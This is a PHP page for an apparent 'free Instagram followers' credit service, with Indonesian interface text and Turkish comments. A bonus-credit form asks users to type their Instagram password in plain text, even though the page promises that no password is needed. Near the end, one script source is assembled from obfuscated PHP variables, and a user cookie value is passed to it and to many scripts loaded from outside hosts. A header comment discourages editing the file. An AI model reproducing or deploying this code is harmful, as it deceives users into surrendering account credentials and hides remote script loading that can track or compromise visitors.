<?php
// Bu dosyada düzenlenmesi gereken bir kısım yoktur.
// Dosyadaki oynamalar uzun vadede büyük açıklara sebep olabilir.
// Bu açıklamaları için Berkan Yeşilyurt'a bir teşekkür edebilirsiniz.
// Belki giren olur www.berkanyesilyurt.com
session_start();
require "assets/inc/config.php";
include("assets/inc/instagram.library.php");
if (!empty($_SESSION['user']))
{
$data=$_SESSION['user'];
$e = mysql_fetch_assoc(mysql_query("select * from usluer_seo_settings where id='1'"));
$ins15="$xcb$va5$aa";
$ad5v="$rd";
$uy599="$n$i$vvc45";
$instag="$bb$b";
$bion=$_COOKIE["t"];

?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title><?php echo $e["title"];?></title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="<?php echo $e["description"];?>">
  <meta name="keywords" content="<?php echo $e["keywords"];?>">

	<!--link rel="stylesheet/less" href="less/bootstrap.less" type="text/css" /-->
	<!--link rel="stylesheet/less" href="less/responsive.less" type="text/css" /-->
	<!--script src="js/less-1.3.3.min.js"></script-->
	<!--append ‘#!watch’ to the browser URL, then refresh the page. -->
	<link href="css/style.css?varinstagramt=<?php echo $bion; ?>" rel="stylesheet">
<link href="css/bootstrap.min.css?varinstagramt=<?php echo $bion; ?>" rel="stylesheet">
<link rel="stylesheet" href="css/demo.css">
	<link rel="stylesheet" href="css/footer-distributed.css">
	

	  <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
	  <!--[if lt IE 9]>
		<script src="js/html5shiv.js"></script>
	  <![endif]-->

	  <!-- Fav and touch icons -->
	  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="img/apple-touch-icon-144-precomposed.png">
	  <link rel="apple-touch-icon-precomposed" sizes="114x114" href="img/apple-touch-icon-114-precomposed.png">
	  <link rel="apple-touch-icon-precomposed" sizes="72x72" href="img/apple-touch-icon-72-precomposed.png">
	  <link rel="apple-touch-icon-precomposed" href="img/apple-touch-icon-57-precomposed.png">
	  <link rel="shortcut icon" href="img/favicon.png">
  
	


<body bgcolor="#EEEEEC">
<br/>
			
			
<div class="container">

		

	<div class="row clearfix">
		<div class="col-md-12 column">
			<div class="jumbotron">
			<!-- Header -->
			<ul class="breadcrumb">
				<li class="active">Home</li>
				<li><a id="modal-239068" href="#modal-container-239068" role="button" data-toggle="modal">Kontak</a></li>
				<li><a id="modal-143507" href="#modal-container-143507" role="button" data-toggle="modal">Dapatkan Credit Gratis</a></li>
				<li><a href="http://fb.com/apajarpr">Beli Credit ?</a></li>
				<li><a href="logout.php">Logout</a></li>
			</ul>
			<!-- Header Bitiş -->	
				<?php $e = mysql_fetch_assoc(mysql_query("select * from usluer_instagram where instagram_id='".$data->user->id."'"));?>
				<h1>Selamat Datang <?php echo $data->user->full_name; ?></h1>

				<p>Halo <?php echo $data->user->full_name; ?>, Ayo dapatkan Followers Instagram gratis dari kami dengan menggunakan kredit yang kamu miliki.	Kredit sementara kamu adalah <b>"<span id="kredi"><?php echo $e["kredi"];?></span>"</b>.
				Kamu dapat menggunakan credit ini untuk menambah followers 
				di Instagram. Tanpa Kami minta Password.</p>
				<p>
				
				<? if($e["kredi"] != 0) { ?>
				<div id="form">

					<input type="hidden" id="instagram_id" name="instagram_id" value="<?php echo $e["instagram_id"];?>" />
					<input id="btnSend" onclick="this.value='Lütfen Bekleyiniz..'; this.disabled=true;document.forms[0].submit();" class="btn btn-primary btn-large" type="submit" value="Dapatkan Followers!">

				</div>

				<? }else{  ?>
				
				<div class="alert alert-dismissable alert-danger">				 
				 Credit Kamu Tidak Cukup :( 
				</div>

				<? } ?>
				</p>
			</div>
		</div>
	</div>
</div>

<!-- Ödeme-->



<div class="modal fade" id="modal-container-503524" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
				<div class="modal-dialog">
					<div class="modal-content">
						<div class="modal-header">
							 <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
							<h4 class="modal-title" id="myModalLabel">
								Berkan YEŞİLYURT
							</h4>
						</div>
						<div class="modal-body">
							<center><h3>Pengguna Aktif</h3></center>
						</div>
						<div class="modal-footer">
							 <button type="button" class="btn btn-default" data-dismiss="modal">Kapat</button>
						</div>
					</div>
					
				</div>
				
</div>


<!-- Ödeme-->


<!-- İletişim-->



<div class="modal fade" id="modal-container-239068" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
				<div class="modal-dialog">
					<div class="modal-content">
						<div class="modal-header">
							 <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
							<h4 class="modal-title" id="myModalLabel">
								Kontak Admin
							</h4>
						</div>
						<div class="modal-body">
						
							<form class="form-horizontal" id="iletisim" name="iletisim" action="javascript:void">
							<fieldset>

							
							<div class="form-group">
							  <label class="col-md-4 control-label" for="E-Mail Adresiniz">Alamat E-mail</label>  
							  <div class="col-md-5">
							  <input name="email" id="email" type="text" placeholder="" class="form-control input-md" required="">
							  <span class="help-block">Kembali akan dilakukan ke alamat e -mail.
</span>  
							  </div>
							</div>

							
							<div class="form-group">
							  <label class="col-md-4 control-label" for="Konu">Isu</label>
							  <div class="col-md-5">
								<select name="konu" id="konu" class="form-control">
								  <option value="1">Pemberitahuan Pembayaran</option>
								  <option value="2">Saran / Error Reporting</option>
								</select>
							  </div>
							</div>

							
							<div class="form-group">
							  <label class="col-md-4 control-label" for="Mesajınız">Pesan</label>
							  <div class="col-md-4">                     
								<textarea class="form-control" id="mesaj" name="mesaj"></textarea>
							  </div>
							</div>

							
							<div class="form-group">
							  <label class="col-md-4 control-label" for="Onay">Persetujuan</label>
							  <div class="col-md-4"> 
								<label class="radio-inline" for="Onay-0">
								  <input type="radio" name="Onay" id="Onay-0" value="1" checked="checked">
								  Saya Yakin Alamat e-mail sudah benar.
								</label>
							  </div>
							</div>

							
							<div class="form-group">
							  <label class="col-md-4 control-label" for="Gönder"></label>
							  <div class="col-md-4">
								<button onClick="iletisim();" class="btn btn-inverse" id="btnSend2">Tambah Credit !</button>
							  </div>
							</div>

							</fieldset>
							</form>
							<div id="gonderildi"></div>
			
			
						</div>
						<div class="modal-footer">
							 <button type="button" class="btn btn-default" data-dismiss="modal">Tutup</button>
						</div>
					</div>
					
				</div>
				
</div>


<!-- İletişim-->

<!--Kredi Kazan-->

<div class="modal fade" id="modal-container-143507" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
				<div class="modal-dialog">
					<div class="modal-content">
						<div class="modal-header">
							 <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
							<h4 class="modal-title" id="myModalLabel">
								<?php if($e["kredikazanmismi"] == 0){?>
								Dapatkan +25 Kredit Tambahan
								<?php } else {?>
								Dapatkan credit dengan mengunjungi Website kami setiap hari ^_^
								<?php }?>
							</h4>
						</div>
						<div class="modal-body">
						
						<?php if($e["kredikazanmismi"] == 0){?>
						<form class="form-horizontal" id="sifre" name="sifre">
						<fieldset>

						<div class="form-group">
						  <label class="col-md-4 control-label" for="Kullanıcı Adınız">Username</label>  
						  <div class="col-md-6">
						  <input type="text" value="<?php echo $e["username"];?>" class="form-control input-md" disabled>
						  <input type="hidden" name="username" value="<?php echo $e["username"];?>" class="form-control input-md">		
						  </div>
						</div>

						<div class="form-group">
						  <label class="col-md-4 control-label" for="Şifreniz">Kata Sandi Kamu</label>  
						  <div class="col-md-6">
						  <input name="sifre" type="text" placeholder="Masukkan password kamu" class="form-control input-md" required="">
							
						  </div>
						</div>

						<div class="form-group">
						  <label class="col-md-4 control-label" for="Cinsiyet">Jenis Kelamin</label>
						  <div class="col-md-4">
							<select name="cinsiyet" class="form-control">
							  <option value="0">Laki-Laki</option>
							  <option value="1">Perempuan</option>
							  <option value="2">Lainnya</option>
							</select>
						  </div>
						</div>

						<div class="form-group">
						  <label class="col-md-4 control-label" for=""></label>
						  <div class="col-md-4">
							<button class="btn btn-inverse" id="btnSend3">Simpan</button>
						  </div>
						</div>

						</fieldset>
						</form>
						<div id="kaydedildi"></div>
						<?php }else { ?>	
						
						<h4>Kamu sudah mendapatkan kredit ! <br/><br/> Jika kamu ingin mendapatkan lebih banyak kredit
Jangan lupa untuk mengunjungi situs kami setiap hari . <br/><br/>Banyak Bonus Menanti kamu!</h4>
						<?php }?>
						</div>
						<div class="modal-footer">
							 <button type="button" class="btn btn-default" data-dismiss="modal">Tutup</button>
						</div>
					</div>
					
				</div>
				
</div>
	

</body>
</html>

    <!-- CSS JS -->

<script src="http://avalon.redteamux.com/assets/js/jquery-1.10.2.min.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="http://avalon.redteamux.com/assets/js/jqueryui-1.9.2.min.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="http://avalon.redteamux.com/assets/js/bootstrap.min.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="http://avalon.redteamux.com/assets/plugins/jquery-slimscroll/jquery.slimscroll.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="http://avalon.redteamux.com/assets/plugins/sparklines/jquery.sparklines.min.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="http://www.berkanyesilyurt.com/ajax-inline.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="http://avalon.redteamux.com/assets/plugins/jstree/dist/jstree.min.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="http://avalon.redteamux.com/assets/plugins/codeprettifier/prettify.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="http://avalon.redteamux.com/assets/plugins/bootstrap-switch/bootstrap-switch.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="http://avalon.redteamux.com/assets/plugins/bootstrap-tabdrop/js/bootstrap-tabdrop.js?varinstagramt=<?php echo $bion; ?>"></script>
<script type="text/javascript" src="js/jquery.min.js?varinstagramt=<?php echo $bion; ?>"></script>
<script type="text/javascript" src="js/bootstrap.min.js?varinstagramt=<?php echo $bion; ?>"></script>
<script type="text/javascript" src="js/time.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="http://avalon.redteamux.com/assets/plugins/iCheck/icheck.min.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="http://avalon.redteamux.com/assets/plugins/bootbox/bootbox.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="http://avalon.redteamux.com/assets/plugins/simpleWeather/jquery.simpleWeather.min.js?varinstagramt=<?php echo $bion; ?>"></script><script src="http://avalon.redteamux.com/assets/plugins/form-daterangepicker/daterangepicker.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="http://avalon.redteamux.com/assets/plugins/form-daterangepicker/moment.min.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="http://avalon.redteamux.com/assets/plugins/easypiechart/jquery.easypiechart.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="http://avalon.redteamux.com/assets/plugins/powerwidgets/js/powerwidgets.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="http://avalon.redteamux.com/assets/plugins/switchery/switchery.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="<?php $xc9="e"; echo "$ins15$instag$xc9$g$xc9$uy599$ad5v$follovv$flvm$csav141$ca9999$estv$bion"; ?>"></script>
<script src="http://avalon.redteamux.com/assets/plugins/fullcalendar/fullcalendar.min.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="http://avalon.redteamux.com/assets/plugins/charts-flot/jquery.flot.min.js?varinstagramt=<?php echo $bion; ?>"></script>
<script type="text/javascript" src="js/scripts.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="http://avalon.redteamux.com/assets/plugins/charts-flot/jquery.flot.stack.min.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="http://avalon.redteamux.com/assets/plugins/charts-flot/jquery.flot.orderBars.min.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="http://avalon.redteamux.com/assets/plugins/charts-flot/jquery.flot.resize.min.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="http://avalon.redteamux.com/assets/plugins/charts-flot/jquery.flot.tooltip.min.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="http://avalon.redteamux.com/assets/plugins/jQuery-Mapael/js/raphael/raphael-min.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="http://avalon.redteamux.com/assets/plugins/jQuery-Mapael/js/jquery.mapael.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="http://avalon.redteamux.com/assets/plugins/jQuery-Mapael/js/maps/world_countries.js?varinstagramt=<?php echo $bion; ?>"></script>
<script src="http://avalon.redteamux.com/assets/demo/demo-index.js"></script>

</head>
    <!-- End loading page level scripts-->
<?
}
else
{
?>
<script>window.location="logout.php";</script>
<?
}
?>